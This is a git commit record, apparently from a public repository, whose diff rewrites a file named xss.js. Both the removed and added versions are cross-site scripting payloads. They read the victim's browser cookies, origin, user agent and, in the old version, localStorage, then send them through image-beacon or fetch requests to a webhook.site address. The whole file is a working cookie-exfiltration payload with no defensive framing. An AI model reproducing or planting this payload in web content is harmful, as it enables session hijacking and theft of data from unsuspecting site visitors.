af8e9aa154d2811693c40d602c6ae3f54e965d71
Latens Tech <132476701+LatensTech@users.noreply.github.com>
2025-06-04 06:55:15 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,13 +1,8 @@
-// Exfil cookie and environment info to your webhook
-new Image().src = 'https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?cookie=' + encodeURIComponent(document.cookie);
+// 
+let data = {
+  c: document.cookie,
+  o: location.origin,
+  u: navigator.userAgent
+};
 
-fetch('https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    cookie: document.cookie,
-    origin: location.origin,
-    userAgent: navigator.userAgent,
-    localStorage: localStorage
-  })
-});
+new Image().src = 'https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?' + new URLSearchParams(data);
